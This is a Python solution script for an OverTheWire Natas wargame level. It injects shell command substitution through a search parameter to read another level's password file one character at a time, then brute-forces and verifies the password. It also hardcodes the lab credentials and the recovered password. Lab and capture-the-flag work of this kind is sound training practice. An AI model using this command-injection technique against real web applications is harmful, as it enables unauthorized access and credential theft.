from re import I
from bs4 import BeautifulSoup
import requests
from requests.auth import HTTPBasicAuth

URL = "http://natas16.natas.labs.overthewire.org/"

def createRequest(position):
	queryURL = f"{URL}?needle=$(cut+-c+{str(position)}+/etc/natas_webpass/natas17)"
	request = requests.get(queryURL, auth=HTTPBasicAuth("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"))
	soup = BeautifulSoup(request.content, "html.parser")
	content = soup.find("pre").get_text().strip()
	return content

natas17URL = "http://natas17.natas.labs.overthewire.org/"
unauthorizedNatas17 = requests.get(natas17URL).text

def checkPass(password):
	if requests.get(natas17URL, auth=HTTPBasicAuth("natas17", password)).text != unauthorizedNatas17:
		print("FOUND PASSWORD: " + password)
		exit()


def bruteForce(position, currPass):
	print("Trying Password: " + currPass + " . The position is: " + str(position))
	if position == 33:
		#check password as password is of length 32
		return checkPass(currPass)

	content = createRequest(position)
	# print("The <pre> content is: " + content)
	content = content.splitlines()

	if len(content) == 0:
		#the dictionary contains every single possible letter
		#so if there are no results, must mean this letter is a number

		#if i just loop 0-10 its pretty inefficient
		#if this script doesnt finish by tmrw you can use regex instead
		for i in range(10):
			bruteForce(position+1, currPass + str(i))
		return

	# set comprehension of all possible characters
	possibleChars = {char for char in content[0]}

	for i in range(1, len(content)):
		if len(possibleChars) == 1:
			break
		currStr = content[i].lower()
		newPossibleChars = set()
		for char in possibleChars:
			if char in currStr:
				newPossibleChars.add(char)
		possibleChars = newPossibleChars

	for char in possibleChars:
		if not char.isalnum():
			continue
		bruteForce(position+1, currPass + char.lower())
		bruteForce(position+1, currPass + char.upper())

# cut is 1 indexed, so position has to start from 1
# bruteForce(1, "")
bruteForce(26, "8Ps3H0GWbn5rd9S7GmAdgQNdk") #just helping it a bit
#normally would take way to long to run unless I can figure out how to use grep to find n characters
# which should be possible but i am not sure how
# oh well im moving on to the next one
# 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
